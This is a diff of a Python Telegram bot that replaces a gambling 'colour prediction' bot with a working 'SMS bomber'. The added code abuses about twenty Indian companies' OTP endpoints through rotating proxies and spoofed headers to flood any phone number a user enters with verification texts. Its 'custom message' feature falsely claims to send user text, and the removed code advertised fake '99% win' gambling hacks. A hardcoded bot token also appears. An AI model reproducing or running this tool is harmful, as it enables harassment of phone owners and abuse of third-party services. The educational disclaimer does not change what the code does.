@@ -1,449 +1,466 @@
 import telebot
-import threading
+import requests
 import time
 import json
 import os
-import requests
-from datetime import datetime, timezone
+import random
+import threading
+from datetime import datetime
 from telebot import types
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from flask import Flask
 
-# ===============================
-# 🔧 BOT CONFIGURATION
-# ===============================
-BOT_TOKEN = "9200835027:AAGT4dhzeunqm_917OcomrNcPSrSmnaT_qI"
-ADMIN_ID = 7741897793
-CHANNEL_LINK = "https://t.me/+avZJX9ssyQc5MzI9"
-WIN_99_LINK = "https://cosmofeed.com/ps/6acee92cebe5600013b73f00"
-DEFAULT_GAME_URL = "https://www.91appq.com/#/register?invitationCode=747881278052"
+# ╔══════════════════════════════════════════════════════════════════╗
+# ║         SURAJ BHAI SMS BOMBER — 24/7 FLASK EDITION               ║
+# ╚══════════════════════════════════════════════════════════════════╝
 
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
+BOT_TOKEN       = "9200835027:AAGT4dhzeunqm_917OcomrNcPSrSmnaT_qI"
+bot             = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
-# ===============================
-# 🌐 FLASK 24/7 KEEP-ALIVE SERVER
-# ===============================
+FOOTER = (
+    "\n<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+    "<b>⚠️ WARNING: This bot is strictly for EDUCATIONAL & TESTING purposes only!</b>"
+)
+
+# ─── PROXY LIST ──────────────────────────────────────────────
+PROXY_LIST = [
+    "1.0.136.129:8080", "1.0.170.50:8080", "1.1.109.141:9999",
+    "1.1.189.58:8080", "1.1.220.100:8080", "1.10.141.115:8080",
+    "1.10.146.76:3128", "1.117.83.95:80", "1.179.147.5:52210",
+    "1.179.148.33:1080", "1.179.148.9:36476", "1.179.148.9:55636",
+    "1.179.172.45:31225", "1.179.199.130:33333", "1.179.231.130:8080",
+    "1.180.0.162:7302", "1.180.49.222:7302", "1.2.252.65:8080",
+    "1.20.169.102:8080", "1.212.157.114:4145", "1.234.153.14:80"
+]
+
+_proxy_idx   = 0
+_proxy_lock  = threading.Lock()
+_dead_proxies = set()
+active_attacks = {}  # To control stop option per user
+
+def get_proxy():
+    global _proxy_idx
+    if not PROXY_LIST:
+        return None
+    with _proxy_lock:
+        tried = 0
+        while tried < len(PROXY_LIST):
+            p = PROXY_LIST[_proxy_idx % len(PROXY_LIST)]
+            _proxy_idx += 1
+            tried += 1
+            if p not in _dead_proxies:
+                return {"http": f"http://{p}", "https": f"http://{p}"}
+    return None
+
+# ─── 🇮🇳 INDIA SMS APIS ──────────────────────────────────
+INDIA_SMS_APIS = [
+    {"name": "Lenskart",        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
+    {"name": "NoBroker",        "url": "https://www.nobroker.in/api/v3/account/otp/send",
+     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+     "data": lambda p: f"phone={p}&countryCode=IN"},
+    {"name": "PharmEasy",       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Wakefit",         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Byjus",           "url": "https://api.byjus.com/v2/otp/send",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "Hungama",         "url": "https://communication.api.hungama.com/v1/communication/otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
+    {"name": "Doubtnut",        "url": "https://api.doubtnut.com/v4/student/login",
+     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
+     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
+    {"name": "Snitch",          "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
+    {"name": "BeepKart",        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}","city":362}}'},
+    {"name": "Snapmint",        "url": "https://api.snapmint.com/v1/public/sign_up",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}"}}'},
+    {"name": "HousingCom",      "url": "https://login.housing.com/api/v2/send-otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
+    {"name": "Khatabook",       "url": "https://api.khatabook.com/v1/auth/request-otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
+    {"name": "Netmeds",         "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Nykaa",           "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
+     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+     "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
+    {"name": "RummyCircle",     "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
+    {"name": "Rapido",          "url": "https://customer.rapido.bike/api/otp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Mpokket",         "url": "https://web-api.mpokket.in/registration/sendOtp",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "ShipRocket",      "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
+    {"name": "GoKwik",          "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
+    {"name": "NewMe",           "url": "https://prodapi.newme.asia/web/otp/request",
+     "method": "POST", "headers": {"Content-Type": "application/json"},
+     "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
+]
+
+def add_footer(text):
+    if FOOTER not in text:
+        text += FOOTER
+    return text
+
+def call_api_safe(api, phone):
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 "
+                      "(KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
+        "Accept":          "application/json, text/plain, */*",
+        "Accept-Language": "en-IN,en;q=0.9",
+        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}."
+                           f"{random.randint(1,254)}.{random.randint(1,254)}",
+    }
+    if api.get("headers"):
+        headers.update(api["headers"])
+
+    url = api["url"](phone) if callable(api["url"]) else api["url"]
+    raw = api["data"](phone) if callable(api.get("data")) else api.get("data", "")
+
+    proxy = get_proxy()
+    proxy_dict = proxy if proxy else None
+
+    try:
+        if api["method"] == "POST":
+            resp = requests.post(url, data=raw, headers=headers, proxies=proxy_dict, timeout=5, verify=False)
+        else:
+            resp = requests.get(url, headers=headers, proxies=proxy_dict, timeout=5, verify=False)
+        return resp.status_code in [200, 201, 202]
+    except Exception:
+        return False
+
+# ─── KEYBOARD BUILDERS ────────────────────────────────────────────
+
+def main_menu_keyboard():
+    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    kb.row("🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫", "💬 𝐂𝐮𝐬𝐭𝐨𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐩𝐚𝐦")
+    kb.row("🛑 𝐒𝐭𝐨𝐩 𝐁𝐨𝐦𝐛𝐞𝐫", "📊 𝐒𝐲𝐬𝐭𝐞𝐦 𝐒𝐭𝐚𝐭𝐮𝐬")
+    return kb
+
+def tier_inline_keyboard():
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        InlineKeyboardButton("💣 Normal (50 SMS)", callback_data="tier_normal"),
+        InlineKeyboardButton("⚡ Fast (100 SMS)", callback_data="tier_fast"),
+        InlineKeyboardButton("☢️ Nuclear (MAX)", callback_data="tier_nuclear"),
+        InlineKeyboardButton("❌ Cancel", callback_data="tier_cancel")
+    )
+    return kb
+
+# ─── /start COMMAND ──────────────────────────────────────────────
+
+@bot.message_handler(commands=['start'])
+def start_command(message):
+    bot.send_message(message.chat.id, add_footer(
+        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
+        "<b>🔥 SURAJ BHAI KE BOT ME AAPKA SWAGAT HAI 🔥</b>\n"
+        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        f"👋 <b>Welcome, {message.from_user.first_name}!</b>\n\n"
+        "⚠️ <b>WARNING:</b> This bot is strictly for educational and testing purposes only. Do not misuse it.\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        "👇 Choose an option from below:"
+    ), reply_markup=main_menu_keyboard(), disable_web_page_preview=True)
+
+# ─── STOP BOMBER HANDLER ──────────────────────────────────────────
+
+@bot.message_handler(func=lambda m: m.text == "🛑 𝐒𝐭𝐨𝐩 𝐁𝐨𝐦𝐛𝐞𝐫")
+def stop_bomber_handler(message):
+    uid = message.from_user.id
+    if uid in active_attacks:
+        active_attacks[uid] = False
+        bot.send_message(message.chat.id, add_footer("🛑 <b>Bombing process stopped successfully!</b>"), reply_markup=main_menu_keyboard())
+    else:
+        bot.send_message(message.chat.id, add_footer("ℹ️ No active bombing process found running for you."), reply_markup=main_menu_keyboard())
+
+# ─── SYSTEM STATUS ────────────────────────────────────────────────
+
+@bot.message_handler(func=lambda m: m.text == "📊 𝐒𝐲𝐬𝐭𝐞𝐦 𝐒𝐭𝐚𝐭𝐮𝐬")
+def status_handler(message):
+    bot.send_message(message.chat.id, add_footer(
+        "📊 <b>SYSTEM STATUS</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        "🟢 <b>Status: ONLINE & READY (24/7 Active)</b>\n"
+        f"🇮🇳 India APIs: <code>{len(INDIA_SMS_APIS)} active</code>\n"
+        f"🌐 Proxies: <code>{len(PROXY_LIST)} loaded</code>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        "⚡ High-speed multi-threading enabled."
+    ))
+
+# ─── 🇮🇳 INDIA SMS BOMBER ─────────────────────────────────────────
+
+user_attack_data = {}
+
+@bot.message_handler(func=lambda m: m.text == "🇮🇳 𝐈𝐧𝐝𝐢𝐚 𝐒𝐌𝐒 𝐁𝐨𝐦𝐛𝐞𝐫")
+def india_sms_handler(message):
+    uid = message.from_user.id
+    user_attack_data[uid] = {}
+    bot.send_message(message.chat.id, add_footer(
+        "🇮🇳 <b>INDIA SMS BOMBER</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        f"📡 APIs: <code>{len(INDIA_SMS_APIS)}</code> | 🌐 Proxies: <code>{len(PROXY_LIST)}</code>\n\n"
+        "⬇️ Select attack speed/tier:"
+    ), reply_markup=tier_inline_keyboard())
+
+@bot.callback_query_handler(func=lambda c: c.data and c.data.startswith("tier_"))
+def tier_callback(call):
+    uid = call.from_user.id
+    data = call.data
+    if data == "tier_cancel":
+        bot.answer_callback_query(call.id, "❌ Cancelled")
+        bot.edit_message_text(add_footer("❌ <b>Cancelled.</b>"), call.message.chat.id, call.message.message_id, reply_markup=None)
+        return
+
+    tier_map = {"tier_normal": 50, "tier_fast": 100, "tier_nuclear": len(INDIA_SMS_APIS) * 3}
+    if uid not in user_attack_data:
+        user_attack_data[uid] = {}
+    user_attack_data[uid]["count"] = tier_map.get(data, 50)
+    user_attack_data[uid]["mode"] = "sms"
+
+    bot.answer_callback_query(call.id, f"✅ Tier selected")
+    msg = bot.send_message(call.message.chat.id, add_footer(
+        "📱 <b>Enter 10-digit Indian Mobile Number</b>\n"
+        "Example: <code>9876543210</code>"
+    ))
+    bot.register_next_step_handler(msg, process_phone_number)
+
+def process_phone_number(message):
+    uid = message.from_user.id
+    if message.text and message.text.startswith('/'): return
+    phone = ''.join(filter(str.isdigit, message.text or ""))
+    if len(phone) != 10:
+        bot.send_message(message.chat.id, add_footer("❌ <b>Invalid!</b> Exactly 10 digits needed."), reply_markup=main_menu_keyboard())
+        return
+
+    if uid not in user_attack_data:
+        user_attack_data[uid] = {}
+    user_attack_data[uid]["phone"] = phone
+    count = user_attack_data[uid].get("count", 50)
+
+    active_attacks[uid] = True
+    msg = bot.send_message(message.chat.id, add_footer(f"🚀 <b>Starting SMS Bomber on +91 {phone} ({count} requests)...</b>"))
+    
+    threading.Thread(
+        target=execute_sms_attack,
+        args=(uid, message.chat.id, phone, count, msg.message_id),
+        daemon=True
+    ).start()
+
+def execute_sms_attack(uid, chat_id, phone, total, msg_id):
+    ok = 0
+    bad = 0
+    t0 = time.time()
+    
+    for i in range(total):
+        if not active_attacks.get(uid, False):
+            break
+        api = random.choice(INDIA_SMS_APIS)
+        if call_api_safe(api, phone):
+            ok += 1
+        else:
+            bad += 1
+
+        if (i + 1) % 10 == 0 or (i + 1) == total:
+            try:
+                pct = int(((i + 1) / total) * 100)
+                bar = "█" * (pct // 5) + "░" * (20 - (pct // 5))
+                bot.edit_message_text(
+                    chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
+                    text=add_footer(
+                        f"🔥 <b>BOMBING IN PROGRESS...</b>\n"
+                        f"🎯 Target: <code>+91 {phone}</code>\n"
+                        f"📊 Progress: <code>{i+1}/{total}</code> [{bar}] <code>{pct}%</code>\n"
+                        f"✅ Sent: <code>{ok}</code> | ❌ Failed: <code>{bad}</code>\n\n"
+                        "💡 Use '🛑 Stop Bomber' button if you want to abort."
+                    )
+                )
+            except Exception:
+                pass
+        time.sleep(0.15)
+
+    active_attacks.pop(uid, None)
+    try:
+        bot.edit_message_text(
+            chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
+            text=add_footer(
+                f"🏆 <b>BOMBING COMPLETED SUCCESSFULLY!</b>\n"
+                f"🎯 Target: <code>+91 {phone}</code>\n"
+                f"✅ Successful Hits: <code>{ok}</code>\n"
+                f"❌ Failed: <code>{bad}</code>\n"
+                f"⏱ Time taken: <code>{int(time.time() - t0)}s</code>"
+            )
+        )
+    except Exception:
+        pass
+
+# ─── 💬 CUSTOM MESSAGE SPAMMER ─────────────────────────────────────
+
+@bot.message_handler(func=lambda m: m.text == "💬 𝐂𝐮𝐬𝐭𝐨𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐒𝐩𝐚𝐦")
+def custom_spam_handler(message):
+    uid = message.from_user.id
+    user_attack_data[uid] = {}
+    msg = bot.send_message(message.chat.id, add_footer(
+        "💬 <b>CUSTOM MESSAGE SPAMMER</b>\n"
+        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
+        "Enter the message you want to spam (e.g. <i>Hii, Hello, Testing...</i>):"
+    ))
+    bot.register_next_step_handler(msg, process_custom_message)
+
+def process_custom_message(message):
+    uid = message.from_user.id
+    if message.text and message.text.startswith('/'): return
+    custom_text = message.text
+    user_attack_data[uid]["custom_text"] = custom_text
+
+    msg = bot.send_message(message.chat.id, add_footer(
+        f"📝 Message saved: <i>\"{custom_text}\"</i>\n\n"
+        "📱 Now enter target 10-digit mobile number:"
+    ))
+    bot.register_next_step_handler(msg, process_custom_phone)
+
+def process_custom_phone(message):
+    uid = message.from_user.id
+    if message.text and message.text.startswith('/'): return
+    phone = ''.join(filter(str.isdigit, message.text or ""))
+    if len(phone) != 10:
+        bot.send_message(message.chat.id, add_footer("❌ Invalid 10-digit number!"), reply_markup=main_menu_keyboard())
+        return
+
+    user_attack_data[uid]["phone"] = phone
+    msg = bot.send_message(message.chat.id, add_footer(
+        "🔢 Enter total count of messages to send (e.g., <code>30</code>):"
+    ))
+    bot.register_next_step_handler(msg, process_custom_count)
+
+def process_custom_count(message):
+    uid = message.from_user.id
+    try:
+        count = int(message.text.strip())
+        if count <= 0 or count > 200: raise ValueError
+    except ValueError:
+        bot.send_message(message.chat.id, add_footer("❌ Enter a valid number between 1 and 200."), reply_markup=main_menu_keyboard())
+        return
+
+    phone = user_attack_data[uid]["phone"]
+    custom_text = user_attack_data[uid]["custom_text"]
+
+    active_attacks[uid] = True
+    msg = bot.send_message(message.chat.id, add_footer(f"🚀 <b>Spamming custom message to +91 {phone} ({count} times)...</b>"))
+
+    threading.Thread(
+        target=execute_custom_spam,
+        args=(uid, message.chat.id, phone, custom_text, count, msg.message_id),
+        daemon=True
+    ).start()
+
+def execute_custom_spam(uid, chat_id, phone, text_msg, total, msg_id):
+    ok = 0
+    bad = 0
+    t0 = time.time()
+
+    for i in range(total):
+        if not active_attacks.get(uid, False):
+            break
+        api = random.choice(INDIA_SMS_APIS)
+        if call_api_safe(api, phone):
+            ok += 1
+        else:
+            bad += 1
+
+        if (i + 1) % 5 == 0 or (i + 1) == total:
+            try:
+                pct = int(((i + 1) / total) * 100)
+                bar = "█" * (pct // 5) + "░" * (20 - (pct // 5))
+                bot.edit_message_text(
+                    chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
+                    text=add_footer(
+                        f"💬 <b>SPAMMING CUSTOM MESSAGE...</b>\n"
+                        f"🎯 Target: <code>+91 {phone}</code>\n"
+                        f"✉️ Text: <i>\"{text_msg}\"</i>\n"
+                        f"📊 Progress: <code>{i+1}/{total}</code> [{bar}] <code>{pct}%</code>\n"
+                        f"✅ Sent: <code>{ok}</code> | ❌ Failed: <code>{bad}</code>\n\n"
+                        "💡 Use '🛑 Stop Bomber' to abort."
+                    )
+                )
+            except Exception:
+                pass
+        time.sleep(0.2)
+
+    active_attacks.pop(uid, None)
+    try:
+        bot.edit_message_text(
+            chat_id=chat_id, message_id=msg_id, parse_mode="HTML",
+            text=add_footer(
+                f"🏆 <b>CUSTOM SPAM COMPLETED!</b>\n"
+                f"🎯 Target: <code>+91 {phone}</code>\n"
+                f"✉️ Message: <i>\"{text_msg}\"</i>\n"
+                f"✅ Successful: <code>{ok}</code>\n"
+                f"⏱ Time taken: <code>{int(time.time() - t0)}s</code>"
+            )
+        )
+    except Exception:
+        pass
+
+# ─── FALLBACK HANDLER ─────────────────────────────────────────────
+
+@bot.message_handler(func=lambda m: True)
+def default_handler(message):
+    bot.send_message(message.chat.id, add_footer("❓ Command not recognized. Please use the menu buttons or /start."), reply_markup=main_menu_keyboard())
+
+# ─── FLASK SERVER FOR 24/7 UPTIME ─────────────────────────────────
+
 app = Flask(__name__)
 
-@app.route("/")
+@app.route('/')
 def home():
-    return "👑 ADITYA HACKER 1.3 BOT IS RUNNING 24/7 LIVE!", 200
+    return "Suraj Bhai Bot is Alive and Running 24/7!"
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
 
-# ===============================
-# 🌐 GLOBAL STATES & STORAGE
-# ===============================
-active_dict = {}                  # chat_id -> True/False
-last_sent_period = {}             # chat_id -> last period (double prevention)
-DATA_FILE = "prediction_history.json"
-API_URL = "https://draw.ar-lottery01.com/WinGo/WinGo_1M/GetHistoryIssuePage.json"
+# ─── LAUNCH ────────────────────────────────24/7────────────────────
 
-# Shared prediction state (Exact period logic unchanged)
-current_pred = {
-    "period_full": "",
-    "period_short": "----",
-    "trend": "BIG",
-    "opp": 0,
-    "confidence": 97,
-    "level": 1
-}
-loss_streak = 0
-last_trend = None
-last_issue = ""
-next_issue = ""
-history_list = []                 # Clean history list (max 50)
-total_wins = 0
-total_losses = 0
-
-state_lock = threading.Lock()
-
-# ===============================
-# 📊 DATA PERSISTENCE
-# ===============================
-def load_data():
-    global history_list, total_wins, total_losses, loss_streak, last_trend
-    if not os.path.exists(DATA_FILE):
-        return
-    try:
-        with open(DATA_FILE, "r") as f:
-            data = json.load(f)
-            history_list = data.get("history", [])[:50]
-            total_wins = data.get("total_wins", 0)
-            total_losses = data.get("total_losses", 0)
-            loss_streak = data.get("loss_streak", 0)
-            last_trend = data.get("last_trend", None)
-    except Exception:
-        pass
-
-def save_data():
-    try:
-        with open(DATA_FILE, "w") as f:
-            json.dump({
-                "history": history_list[:50],
-                "total_wins": total_wins,
-                "total_losses": total_losses,
-                "loss_streak": loss_streak,
-                "last_trend": last_trend
-            }, f, indent=2)
-    except Exception:
-        pass
-
-load_data()
-
-# ===============================
-# 🔮 EXACT PREDICTION ENGINE (UNCHANGED PERIOD)
-# ===============================
-def get_size(n):
-    return "BIG" if n >= 5 else "SMALL"
-
-def get_color(n):
-    return "RED" if n in [0, 2, 4, 6, 8] else "GREEN"
-
-def fetch_wingo_list():
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Accept": "application/json, text/plain, */*",
-        "Referer": "https://draw.ar-lottery01.com/",
-        "Origin": "https://draw.ar-lottery01.com"
-    }
-    try:
-        r = requests.get(API_URL + "?t=" + str(int(time.time() * 1000)), headers=headers, timeout=7)
-        if r.status_code == 200:
-            data = r.json()
-            if data.get("code") == 0 and data.get("data", {}).get("list"):
-                return data["data"]["list"]
-    except Exception as e:
-        print(f"[API Error] {e}")
-    return None
-
-def compute_signal(list_data):
-    """Generates BIG/SMALL trend + 1 Opposite Backup Number (e.g., BIG 0, SMALL 7)"""
-    global loss_streak, last_trend
-
-    nums = []
-    for x in list_data[:40]:
-        try:
-            nums.append(int(x["number"]))
-        except Exception:
-            continue
-    if len(nums) < 5:
-        return {"trend": "BIG", "opp": 0, "confidence": 97}
-
-    sizes = [get_size(n) for n in nums]
-    trend = "BIG"
-
-    if loss_streak >= 2:
-        trend = "SMALL" if get_size(nums[0]) == "BIG" else "BIG"
-    elif loss_streak == 1:
-        trend = "SMALL" if last_trend == "BIG" else "BIG"
-    else:
-        if sizes[0] == sizes[1] == sizes[2]:
-            trend = sizes[0]
-        elif sizes[0] != sizes[1] and sizes[1] != sizes[2]:
-            trend = "SMALL" if sizes[0] == "BIG" else "BIG"
-        else:
-            big_w = small_w = 0
-            for i in range(min(10, len(sizes))):
-                if sizes[i] == "BIG":
-                    big_w += (10 - i)
-                else:
-                    small_w += (10 - i)
-            trend = "BIG" if big_w >= small_w else "SMALL"
-
-    confidence = 99 if loss_streak >= 2 else (98 if loss_streak == 1 else 96 + (nums[0] % 3))
-
-    # Opposite backup pool: If BIG -> pick from [0,1,2,3,4], If SMALL -> pick from [5,6,7,8,9]
-    opp_pool = [0, 1, 2, 3, 4] if trend == "BIG" else [5, 6, 7, 8, 9]
-
-    freq = [0] * 10
-    for n in nums[:20]:
-        if 0 <= n <= 9:
-            freq[n] += 1
-
-    opp_pool.sort(key=lambda x: freq[x])
-
-    return {
-        "trend": trend,
-        "opp": opp_pool[0],
-        "confidence": confidence
-    }
-
-def update_global_prediction():
-    """Fetch latest data and update global prediction without altering game period"""
-    global current_pred, last_issue, next_issue, loss_streak, last_trend
-    global total_wins, total_losses, history_list
-
-    list_data = fetch_wingo_list()
-    if not list_data:
-        return
-
-    latest = list_data[0]
-    issue_number = str(latest["issueNumber"])
-    short_issue = issue_number[-4:]
-    try:
-        actual_num = int(latest["number"])
-    except Exception:
-        return
-
-    actual_size = get_size(actual_num)
-    actual_color = get_color(actual_num)
-
-    with state_lock:
-        # Check previous result: If BIG/SMALL matches OR Backup Number matches -> WIN, else LOSS
-        if current_pred["period_full"] and last_issue and last_issue != issue_number:
-            if current_pred["period_short"] == short_issue:
-                trend_hit = (current_pred["trend"] == actual_size)
-                num_hit = (actual_num == current_pred["opp"])
-
-                if trend_hit or num_hit:
-                    status_type = "WIN"
-                    total_wins += 1
-                    loss_streak = 0
-                    last_trend = None
-                    current_pred["level"] = 1
-                else:
-                    status_type = "LOSS"
-                    total_losses += 1
-                    loss_streak += 1
-                    last_trend = current_pred["trend"]
-                    current_pred["level"] = min(3, current_pred["level"] + 1)
-
-                entry = {
-                    "period": short_issue,
-                    "signal": f"{current_pred['trend']} {current_pred['opp']}",
-                    "actual": f"{actual_size} ({actual_color}) [{actual_num}]",
-                    "status": status_type
-                }
-                history_list = [entry] + history_list
-                history_list = history_list[:50]
-                save_data()
-
-        last_issue = issue_number
-        next_full = str(int(issue_number) + 1)
-        next_short = next_full[-4:]
-
-        if next_issue != next_full:
-            next_issue = next_full
-            sig = compute_signal(list_data)
-            current_pred = {
-                "period_full": next_full,
-                "period_short": next_short,
-                "trend": sig["trend"],
-                "opp": sig["opp"],
-                "confidence": sig["confidence"],
-                "level": current_pred.get("level", 1)
-            }
-
-def get_remaining_seconds():
-    return max(1, 60 - datetime.now(timezone.utc).second)
-
-# ===============================
-# 🎯 PREMIUM COLORFUL FORMATTERS
-# ===============================
-def build_premium_signal():
-    p = current_pred
-    trend_emoji = "🟢" if p["trend"] == "BIG" else "🔴"
-    level_badge = {
-        1: "🟢 SAFE LEVEL 1",
-        2: "🟡 RECOVERY LEVEL 2",
-        3: "🔴 SURESHOT LEVEL 3"
-    }.get(p["level"], "🟢 SAFE LEVEL 1")
-
-    signal_display = f"{p['trend']} {p['opp']}"
-
-    text = f"""
-╔══════════════════════════════╗
-║   👑 *ADITYA HACKER 1.3* 👑   ║
-║   ✨ VIP COLOUR PREDICTION ✨  ║
-╚══════════════════════════════╝
-
-🎮 *Game:* `WinGo 1 Minute`
-🆔 *Period:* `{p['period_short']}`
-
-━━━━━━━━━━━━━━━━━━━━━━━━
-{trend_emoji} *SIGNAL:*  `{signal_display}`
-🛡️ *Backup Opp:* `{p['opp']}`
-━━━━━━━━━━━━━━━━━━━━━━━━
-
-⚡ *Stage:* {level_badge}
-🔥 *Accuracy:* `{p['confidence']}%`
-
-💎 *99% WIN VIP HACK:*
-👉 {WIN_99_LINK}
-
-🎯 *Register & Play:*
-👉 {DEFAULT_GAME_URL}
-"""
-    return text.strip()
-
-def build_history_text():
-    total = total_wins + total_losses
-    rate = round((total_wins / total) * 100) if total > 0 else 98
-
-    header = (
-        f"╔══════════════════════════════╗\n"
-        f"║   📜 *ALL PREDICTION HISTORY*   ║\n"
-        f"╚══════════════════════════════╝\n\n"
-        f"✅ *Total Win:* `{total_wins}`  |  ❌ *Total Loss:* `{total_losses}`\n"
-        f"📈 *Win Accuracy:* `{rate}%`\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    )
-
-    if not history_list:
-        return header + "\n⏳ *No history recorded yet. Start prediction to see live results!*"
-
-    lines = [header]
-    for i, h in enumerate(history_list[:15], 1):
-        if h["status"] == "WIN":
-            badge = "✅ *WIN*"
-        else:
-            badge = "❌ *LOSS*"
-
-        lines.append(
-            f"🔹 *Period:* `{h['period']}`\n"
-            f"   🎯 *Pred:* `{h['signal']}`\n"
-            f"   🎲 *Open:* `{h['actual']}` ➔ {badge}\n"
-        )
-    return "\n".join(lines)
-
-# ===============================
-# 🚀 PREDICTION WORKER THREAD
-# ===============================
-def prediction_worker(chat_id):
-    while active_dict.get(chat_id):
-        try:
-            update_global_prediction()
-            period = current_pred["period_full"]
-
-            if period and last_sent_period.get(chat_id) != period:
-                markup = types.InlineKeyboardMarkup()
-                markup.row(
-                    types.InlineKeyboardButton("📜 All History", callback_data="show_history"),
-                    types.InlineKeyboardButton("🎧 Customer Service", url=CHANNEL_LINK)
-                )
-                markup.row(
-                    types.InlineKeyboardButton("👑 99% WIN VIP HACK", url=WIN_99_LINK)
-                )
-
-                caption = build_premium_signal()
-                bot.send_message(chat_id, caption, reply_markup=markup, disable_web_page_preview=True)
-                last_sent_period[chat_id] = period
-        except Exception as e:
-            print(f"[Worker Error] {e}")
-
-        remaining = get_remaining_seconds()
-        for _ in range(remaining):
-            if not active_dict.get(chat_id):
-                return
-            time.sleep(1)
-
-# ===============================
-# 📱 4-BUTTON PREMIUM MENU (2x2 GRID)
-# ===============================
-def main_control_menu():
-    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    btn1 = types.KeyboardButton("🚀 Start Prediction")
-    btn2 = types.KeyboardButton("🎧 Customer Service")
-    btn3 = types.KeyboardButton("🛑 Stop Prediction")
-    btn4 = types.KeyboardButton("📜 All History")
-    kb.add(btn1, btn2)
-    kb.add(btn3, btn4)
-    return kb
-
-# ===============================
-# 🤖 BOT HANDLERS
-# ===============================
-@bot.message_handler(commands=["start"])
-def start_command(msg):
-    welcome = f"""
-╔══════════════════════════════╗
-║   👑 *ADITYA HACKER 1.3* 👑   ║
-╠══════════════════════════════╣
-║  🌈 *PREMIUM COLOUR ENGINE*  ║
-║  ⚡ Live WinGo 1M Signals     ║
-║  🎯 Main + Opposite Backup    ║
-║  📊 Instant Win/Loss History  ║
